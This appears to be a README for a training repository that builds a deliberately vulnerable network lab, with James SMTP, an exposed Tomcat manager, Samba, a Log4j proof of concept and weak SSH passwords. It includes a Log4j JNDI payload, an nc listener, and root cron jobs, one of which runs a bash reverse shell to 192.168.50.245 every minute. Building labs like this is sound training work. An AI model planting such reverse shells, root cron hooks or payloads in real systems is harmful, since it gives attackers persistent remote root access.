
# Vulnerable servers

The scripts in this repository is to help you quickly setup a vulnerable network lab for your training. The two main scripts are the pc.sh and mac.sh. The pc.sh is for virtual machines runnning on PC while the mac.sh is for virtual machines running on machine. The pc.sh script has few lines less than the mac.sh script because it will be supplemented by docker container labs from **iconx2020a/vuln docker repository**. You will running the following docker containers in addition for pc labs: 
- docker run --network host iconx2020a/vuln:tomcatamd (pc lab)
- docker run --network host iconx2020a/vuln:log4j (pc lab)
- docker run --network host iconx2020a/vuln:log4jpayloadlinux
- OR use the docker-compose.yml file to run the two log4j containers together (if you like)

For mac labs you may run the following in addition
- docker run --network host iconx2020a/vuln:tomcatm1m2 or docker run --network host iconx2020a/vuln:tomcatm1 (mac lab)
- docker run --network host iconx2020a/vuln:log4jm1 (mac lab)
- docker run --network host iconx2020a/vuln:log4jpayloadm1 (mac lab) or OR use the docker-composem1m2.yml 

* tomcat container is for exploiting tomcat misconfiguration while the log4j is for log4j vulnerability exploitation.

You will install the following labs after you run the the scripts:

- James-2.3.2 vulnerable server with smtp
- Apache-tomcat
- Samba
- Log4j PoC
- ssh server

## Platform
- Install VM Player on Windows or Parrallel Desktop on Mac (whichever works for you)
- Install Ubuntu
- Crone repository on your VM
- Change the mode of the appropriate script to executable with chmod +x pc.sh or chmod +x mac.sh
- Run the script as sudo ./pc.sh or sudo ./mac.sh

## Misconfigurations
- crontab file misconfiguration
- Weak SSH password
- Exposing apache-tomcat manager interface

## Configurations
You will find all configurations and misconfigurations in the files in this repositories. The pc.sh and the mac.sh will copy all the files to the right locations to automatically configure the lab for you.

### Create Start James server Script with the name startjamesserver.sh
```
#startjamesserver.sh
#!/bin/bash
cd /opt/james-2.3.2/bin
echo "apache james server started"
sudo ./run.sh
```

### Run 

chmod + startjamesserver.sh

./startjamesserver.sh to start the server.

## Apache Tomcat Configuration 
* This is for your information only. You dont need to do anything, the scripts will do everything for you.
- Add the user and role to the tomcat-users.xml in the /opt/apache-tomcat-xxx/conf
- Modify the manager file in the Catalina directory to allow remote access (see the manager.xml file)
- Open the port 8081 in the / opt/apache-tomcat-xxx/conf/server.xml file to avoid conflict with log4j which is running on port 8080. 

### Start apache with script name startapache.sh
```
#!/bin/bash
cd /opt/tomcat/apache-tomcat-xxx/bin
./startup.sh
```
## Run apache script
- chmod +x startapache.sh
- sudo ./startapache.sh


## Log4j PoC

Modify the poc.py file to point to the JAVA_HOME. This already done in the poc.py file.
Run the payload generator to generate payload script

```
#generatelog4jpayload.sh
#!/bin/bash
echo "site runs at port 8080"
cd ~/mylog4j/log4j-shell-poc
python3 poc.py --userip localhost --webport 8000 --lport 9001
```
## Run log4j payload generator
- chmod +x generatelog4jpayload.sh
- ./generatelog4jpayload.sh

Where generatelog4jpayload.sh is the name of the script above.

### Start reverse shell listerner

nc -lvnp 9001

### Build the docker image
```
#!/bin/bash
cd ~/mylog4j/log4j-shell-poc
docker build -t log4j-shell-poc .
```
### Run log4j vulnerable website
```
docker run --network host log4j-shell-poc
```
Once it is running, you can access it on localhost:8080

Copy the payload ${jndi:ldap://localhost:1389/a} and paste it in the username field of the vulnerable site. Click on the Login button to pop a shell.

## Samba config
### Create Users password
```
sudo useradd -m username  # or run the ./createuser.sh script to create users.
#add samba password
sudo smbpasswd -a username
#add system password for users
sudo passwd username
#it is possible to sync password but we want to keep it simple here
```
### Configure the Samba users in the smb.conf.
Use the smb.conf file. This will be done automatcically by the script. 
### Restart
sudo systemctl restart smbd

## Crontab configuration
Crontab configuration will be done automatically the script. In case something goes wron then go to sudo nano /etc/crontab and edit the file.

Edit the cron job file as below:
```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
PATH=/home/oslomet:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
*  *   * * *    root    backup.sh
*  *   * * *    root   reverse.sh
*  *   * * *    root    script.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
### Create backup.sh script

```
#!/bin/bash
#chmod +s /bin/bash
# bash -i   >&  /dev/tcp/192.168.50.245/1234  0  >&1
#nc 192.168.50.234 1234
```
### create reverse.sh
```
#!/bin/bash
#bash -i     >&  /dev/tcp/192.168.50.245/1234  0  >&1
#bash -i  >&  /dev/tcp/192.168.50.245/1234  0  >&1 
bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
```
## SSH
* Login to your server
* Create ssh key with ssh-keygen
* Add password (not passphrase) from the 10-million-password-list-top-100.txt from [here](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt) to the key when asked for passphrase.
* Accept the default for the rest of the settings
* Create the authorized_keys file in the .ssh folder if it does not exist
* cat .ssh/id_rsa.pub >> ~/.ssh/authorized_keys
* On your Kali Linux generate ssh keys and transfer the public key to the server with the scp command.
* Add the key to the authorized_keys so that you can authenticate with ssh keys
* Go to the ssh configuration file
* Allow public key authentication
* Disable password authentication
* sudo systemctl restart ssh
* Login from your kali linux with your ssh key
* Once it works go back to the server and enable password authentication
* sudo systemctl restart ssh
* Login to the server again with your key
* Login as one of the samba users
* sudo su josh
* Create a flag in the file.

# References
* https://github.com/kozmer/log4j-shell-poc
* https://phoenixnap.com/kb/ubuntu-samba
* https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html
* https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server
* https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-debian-9
* https://github.com/vulhub/vulhub/tree/master/samba/CVE-2017-7494 -Samba Authenticated RCE (CVE-2017-7494, Aka SambaCry)

